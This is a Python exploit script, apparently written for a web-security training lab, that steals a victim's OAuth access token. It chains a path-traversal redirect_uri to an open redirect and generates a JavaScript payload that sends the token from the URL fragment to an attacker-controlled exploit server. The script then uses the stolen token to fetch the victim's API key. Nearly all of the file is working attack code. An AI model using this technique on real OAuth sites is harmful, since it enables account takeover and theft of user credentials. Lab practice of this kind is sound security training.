import http.client
import json
import re
import ssl
import urllib.parse

LAB_ID = "???"
EXPLOIT_SERVER_ID = "???"


# check out https://oauth-???.oauth-server.net/.well-known/openid-configuration
# WARNING: when trying out vulnerability disable proxy
# mitmproxy drops the fragment part of the url
def GET_social_login() -> http.client.HTTPResponse:
    method, path = 'GET', '/social-login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_oauthcallback(
        authorization_code: str,
        session: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/oauth-callback'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    query_params = [
        ('code', authorization_code),
    ]
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, f"{path}?{urllib.parse.urlencode(query_params)}", body, headers)
    return connection.getresponse()


def GET_me(
        oauth_server_id: str,
        access_token: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/me'
    host, port = f'oauth-{oauth_server_id}.oauth-server.net', 443
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.5',
        'authorization': f'Bearer {access_token}',
        'content-type': 'application/json',
        'dnt': '1',
        'sec-gpc': '1',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'priority': 'u=4',
        'te': 'trailers',
    }
    fields = {
    }
    body = json.dumps(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


response = GET_social_login()
response_body = response.read().decode('utf-8')

print("GET login response:")
print(f"status: {response.status}")
for name, header in response.headers.items():
    print(f'{name}: {header}')
print(response_body)
print()

cookie_header = response.getheader('set-cookie')
session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
oauth_server_id = re.findall(r'oauth-([a-zA-Z0-9]+).oauth-server', response_body)[0]
client_id = re.findall(r'client_id=([a-zA-Z0-9]+)', response_body)[0]
print(f"session: {session}")
print(f"oauth_server_id: {oauth_server_id}")
print(f"client_id: {client_id}")

exploit_uri = f"https://exploit-{EXPLOIT_SERVER_ID}.exploit-server.net/exploit"
enc_exploit_uri = urllib.parse.quote_plus(exploit_uri)
redirect_uri = f"https://{LAB_ID}.web-security-academy.net/oauth-callback/../post/next%3Fpath={enc_exploit_uri}"
print("Exploit")
print("======================================")
print("File:")
print("/exploit")
print()
print("Head:")
print(f"""HTTP/1.1 200  
content-type: text/html; charset=utf-8""")
print()
print("Body:")
print(f"""<script>
const oauth_uri = "https://oauth-{oauth_server_id}.oauth-server.net/auth?client_id={client_id}&redirect_uri={redirect_uri}&response_type=token&scope=openid%20profile%20email";
const exploit_uri = "https://exploit-{EXPLOIT_SERVER_ID}.exploit-server.net/";
const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
const token = urlSearchParams.get('access_token');
if (token !== null) {{
    window.location.replace(exploit_uri + token);
}} else {{
    window.location.replace(oauth_uri);
}}
</script>""")
print("======================================")
print("""
deliver exploit to victim
victim completes the oauth flow
authorization code is sent to the exploit server
""")

access_token = input("authorization code from exploit server's logs: ")
print(f"access_token: {access_token}")
print()

response = GET_me(oauth_server_id, access_token)
response_body = response.read().decode('utf-8')

print("GET me response:")
print(f"status: {response.status}")
for name, header in response.headers.items():
    print(f'{name}: {header}')
print(response_body)
print()

api_key = json.loads(response_body)["apikey"]
print(f"api_key: {api_key}")
